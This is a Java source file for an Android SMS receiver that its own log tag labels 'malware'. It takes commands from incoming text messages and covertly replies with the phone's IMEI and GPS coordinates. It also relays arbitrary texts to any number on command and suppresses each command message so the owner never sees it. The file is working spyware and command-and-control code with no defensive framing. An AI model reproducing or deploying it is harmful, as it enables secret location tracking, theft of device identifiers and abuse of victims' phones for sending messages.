package com.xpf.me.sms.routine.channel;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.xpf.me.sms.routine.AndroidDeviceInfo;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by xgo on 10/30/15.
 */
public class SMSTunnel extends BroadcastReceiver {

    Context context;

    @Override
    public void onReceive(Context context, Intent intent) {

        Log.w("malware", "+ incoming SMS");
        this.context = context;
        final Bundle bundle = intent.getExtras();
        if (bundle == null)
            return;

        // Protocol Data Unit Sms
        final Object[] pdus = (Object[]) bundle.get("pdus");
        SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[0]);

        String source = msg.getDisplayOriginatingAddress();
        String text = msg.getDisplayMessageBody();
        if (callBackAction(source, text))
            abortBroadcast();
    }

    public boolean callBackAction(String source, String text) {
        /* regular expression */
        Pattern number = Pattern.compile("^NUMBER$");
        Pattern ping = Pattern.compile("^PING$");
        Pattern imei = Pattern.compile("^IMEI$");
        Pattern gps = Pattern.compile("^GPS$");
        Pattern smsReplay = Pattern.compile("^SMS:(.*):(.*)");
        Matcher mSmsReplay = smsReplay.matcher(text);

        AndroidDeviceInfo androidDeviceInfo = new AndroidDeviceInfo(context);

        if (ping.matcher(text).matches()) {
            sendSMS(source, "PONG");
            return true;
        } else if (imei.matcher(text).matches()) {
            sendSMS(source, androidDeviceInfo.getImei());
            return true;
        } else if (gps.matcher(text).matches()) {
            String msg = androidDeviceInfo.getLatitude() + " "
                    + androidDeviceInfo.getLongitude();
            sendSMS(source, msg);
            return true;
        } else if (mSmsReplay.matches()) {
            sendSMS(mSmsReplay.group(1), mSmsReplay.group(2));
            return true;
        } else if (number.matcher(text).matches()) {
            Log.i("2333", androidDeviceInfo.getPhoneNumber() + "");
//            sendSMS(source, androidDeviceInfo.getPhoneNumber());
            return true;
        }
        return false;
    }

    private void sendSMS(String dest, String text) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(dest, null, text, null, null);
    }
}
